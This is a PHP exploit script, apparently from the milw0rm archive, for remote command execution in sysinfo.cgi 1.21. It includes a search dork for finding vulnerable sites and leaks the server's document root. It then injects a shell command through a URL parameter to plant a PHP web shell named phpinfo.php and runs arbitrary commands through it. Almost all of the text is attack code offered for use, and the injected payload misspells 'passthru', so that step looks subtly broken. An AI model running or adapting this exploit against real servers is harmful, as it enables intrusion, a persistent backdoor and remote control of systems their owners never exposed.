#!/usr/bin/php -q -d short_open_tag=on
<?
echo "sysinfo.cgi 1.21 remote cmmnds xctn \r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "dork: inurl:sysinfo.cgi ext:cgi\r\n\r\n";

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to sysinfo.cgi\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /cgi-bin/sysinfo/ \n";
echo "php ".$argv[0]." localhost /cgi-bin/sysinfo/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost /cgi-bin/ ls -la -P1.1.1.1:80\r\n";
die;
}

/* tested on sysinfo.cgi v1.21:

   http;//[target]/cgi-bin/sysinfo.cgi?action=systemdoc&name=;[some_command]

   you don't see any output but you can redirect some shellcode to some file

   also you can disclose www path:

   http;//[target]/cgi-bin/sysinfo.cgi?action=debugger
									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

//step 1 -> retrieve application path
$packet ="GET ".$p."sysinfo.cgi?action=debugger HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
sendpacketii($packet);
$temp=explode("name=\"pfad\" value=\"",$html);
$temp2=explode("\"",$temp[1]);
$pfad=$temp2[0];
if ($pfad=='') {die("cannot retrieve document root...\r\n");}
echo "document root ->".$pfad."\r\n";


//step 2 -> we don't see any output, so let's create a php shell, you know, I'm phpcentric
$temp=";echo \<?php passtrhu\(\\\$_GET[cmd]\)?\> > ".$pfad."/phpinfo.php";
$temp=urlencode($temp);
$packet ="GET ".$p."sysinfo.cgi?action=systemdoc&name=".$temp." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
sendpacketii($packet);

//step 3 -> launch commands
$packet ="GET /phpinfo.php?cmd=".urlencode($cmd)." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
sendpacketii($packet);
echo $html;
?>

# milw0rm.com [2006-04-14]
